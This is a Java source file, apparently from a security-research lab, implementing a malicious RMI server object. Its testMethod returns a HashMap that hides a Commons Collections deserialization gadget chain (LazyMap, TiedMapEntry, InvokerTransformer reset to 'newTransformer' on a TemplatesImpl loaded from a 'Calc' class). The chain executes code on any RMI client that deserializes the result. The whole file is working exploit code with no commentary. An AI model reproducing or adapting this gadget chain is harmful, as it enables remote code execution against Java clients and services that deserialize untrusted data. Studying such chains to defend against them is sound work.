package RMI.SAC;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.Calc;
import util.Utils;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.HashMap;
import java.util.Map;

public class TestInterfaceImpl extends UnicastRemoteObject implements TestInterface {
    public TestInterfaceImpl() throws RemoteException {
        super();
    }

    @Override
    public Object testMethod() throws RemoteException {
        try {
            TemplatesImpl templates = Utils.creatTemplatesImpl(Calc.class);
            Transformer invokerTransformer = new InvokerTransformer("getClass", null, null);
            Map innerMap = new HashMap();
            Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, templates);
            HashMap expMap = new HashMap();
            expMap.put(tiedMapEntry, "value");
            outerMap.clear();
            Utils.setFieldValue(invokerTransformer, "iMethodName", "newTransformer");

            return expMap;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
